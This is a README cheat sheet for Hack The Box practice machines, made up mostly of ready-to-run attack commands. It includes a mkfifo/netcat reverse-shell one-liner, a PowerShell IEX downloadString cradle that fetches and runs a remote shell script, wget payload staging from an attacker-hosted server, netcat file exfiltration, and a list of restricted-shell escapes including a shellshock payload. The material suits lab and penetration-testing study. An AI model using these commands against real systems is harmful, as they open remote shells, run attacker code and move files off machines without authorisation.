# Hackthebox tools
**shell.php and shell.ps1** : Use for reverse shell when uploaded to vuln machine
```shell
# Listen for reverse shell
nc -lnvp <port number> 
# Use netcat for reverse shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip address> <port> >/tmp/f
```
**les.sh, LinEnum.sh, lse.sh (Recommended)** : Use for detect vuln in Linux machine

**Sherlock.ps1** : Use for detect vuln in Windows machine

### How to upload files to vuln linux machine
In your machine type : 
```shell
python -m SimpleHTTPServer
```
In vuln machine type : 
```shell
wget (your ip address):8000/(file to upload)
```
Example : 
```shell
wget 10.10.14.62:8000/les.sh
```
### How to execute powershell script to vuln windows machine
In your machine type : 
```shell
python -m SimpleHTTPServer
```
In vuln machine type : 
```shell
# if in powershell
IEX(New-Object Net.WebClient).downloadString('http://<ip address>:8000/<file>')
# or if in cmd
powershell IEX(New-Object Net.WebClient).downloadString('http://<ip address>:8000/<file>')
```
  
Example : 
```shell
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.12.81:8000/shell.ps1')
```
### How to spawn bash shell
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
### How to download file using netcat
```shell
# In your machine
nc -lnvp 6666 > file
# In vuln machine
nc -w 3 <your ip> 6666 < file
```
### How to escape rbash
```shell
ftp > !/bin/sh or !/bin/bash
gdb > !/bin/sh or !/bin/bash
more/man/less > !/bin/sh or !/bin/bash
vim > !/bin/sh or !/bin/bash
vim > :python import os; os.system("/bin/bash")
scp > scp -S /path/yourscript x y:
awk > awk 'BEGIN {system("/bin/sh or /bin/bash")}'
find > find / -name test -exec /bin/sh or /bin/bash \;
except > except spawn sh then sh.
python > python -c 'import os; os.system("/bin/sh")'
php > php -a then exec("sh -i");
perl > perl -e 'exec "/bin/sh";'
lua > os.execute('/bin/sh').
ruby > exec "/bin/sh"
ssh > ssh username@IP - t "/bin/sh" or "/bin/bash"
ssh2 > ssh username@IP -t "bash --noprofile"
ssh3 > ssh username@IP -t "() { :; }; /bin/bash" (shellshock)
ssh4 > ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)
git > git help status > you can run it then !/bin/bash
pico > pico -s "/bin/bash" then you can write /bin/bash and then CTRL + T
zip > zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
tar > tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
```
